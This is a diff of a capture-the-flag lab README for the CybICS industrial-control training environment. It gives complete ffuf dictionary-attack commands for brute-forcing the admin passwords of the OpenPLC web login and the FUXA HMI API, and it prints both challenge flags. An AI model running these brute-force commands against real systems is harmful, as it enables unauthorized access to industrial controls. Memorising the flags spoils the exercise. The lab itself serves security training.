@@ -21,40 +21,40 @@ And the sent payload:
 ![Login Payload](doc/login_payload.png)
 
 ### 🛠️ Setup Steps
-1. Download ffuf:
-   ```sh
-   mkdir ~/ffuf
-   cd ~/ffuf
-   wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
-   tar xf ffuf_2.1.0_linux_amd64.tar.gz
-   ```
+On the CybICS attack machine `ffuf` and the `rockyou` wordlist are already
+installed, so no download is needed:
 
-2. Get a wordlist:
-   ```sh
-   wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-   ```
+```sh
+ffuf -h                                   # already on PATH
+ls /usr/share/wordlists/rockyou.txt       # bundled wordlist
+```
+
+If you work on a machine without them, install ffuf and fetch a wordlist:
+```sh
+wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
+tar xf ffuf_2.1.0_linux_amd64.tar.gz
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+```
 
 ### 🚀 Running the Attack
 Start ffuf with:
-- `-w ./rockyou.txt`: The downloaded wordlist
+- `-w /usr/share/wordlists/rockyou.txt`: The wordlist
 - `-X POST -H "Content-Type: application/x-www-form-urlencoded"`: Information from the login request
 - `-d "username=admin&password=FUZZ"`: Information from the login request payload (FUZZ is replaced by ffuf)
 - `-u http://$DEVICE_IP:8080/login`: The request URL
 - `-fs 4561`: The length of the response on wrong login
 
 ```sh
-./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -raw -u http://$DEVICE_IP:8080/login -fs 4561
+ffuf -v -w /usr/share/wordlists/rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -raw -u http://$DEVICE_IP:8080/login -fs 4561
 ```
 
-For more info, start it without parameters:
-```sh
-./ffuf
-```
+For more info, run `ffuf` without parameters.
 
 ## 🎯 Task
-Brute-force the login credentials for both the OpenPLC web interface and the FUXA HMI using a dictionary attack with ffuf.
+This module covers two scored challenges, both solved with an ffuf dictionary attack. Flags have the format `CybICS(flag)`:
 
-The flag has the format `CybICS(flag)`.
+- **OpenPLC Password Attack** — brute-force the OpenPLC web login (port 8080) and read the flag from the user account. Flag: `CybICS(0penPLC)`.
+- **FUXA Password Attack** — brute-force the FUXA HMI login (port 1881) and read the flag shown after login. Flag: `CybICS(FU##A)`.
 
 ### Steps
 1. Analyze the OpenPLC login page at port 8080 (examine the request and response in the browser developer console)
@@ -64,9 +64,11 @@ The flag has the format `CybICS(flag)`.
 5. Apply the same approach to the FUXA HMI at port 1881
 6. Log in to FUXA and find the flag
 
-## 🔍 Solution (OpenPLC)
+## 🔍 Solution: OpenPLC Password Attack
 
-**Flag:** `CybICS(0penPLC)`
+Brute-force `admin` at `http://$DEVICE_IP:8080/login`, log in with the recovered password, open the **Users** page and read the admin account's details.
+
+**Flag:** `CybICS(0penPLC)` (submit for the *OpenPLC Password Attack* challenge)
 
   ![Flag OpenPLC Password](doc/flag.png)
 
@@ -117,13 +119,13 @@ FUXA is running at [http://<DEVICE_IP>:1881](http://<DEVICE_IP>:1881).
 - **OpenPLC**: The flag is part of the user information.
 - **FUXA**: The flag appears after successful login on the HMI.
 
-## 🔍 Solution (FUXA)
+## 🔍 Solution: FUXA Password Attack
 
 Run the attack:
   ```sh
-  ./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
+  ffuf -v -w /usr/share/wordlists/rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
   ```
 
-**Flag:** `CybICS(FU##A)`
+**Flag:** `CybICS(FU##A)` (submit for the *FUXA Password Attack* challenge)
 
   ![Flag FUXA Password](doc/flag2.png)
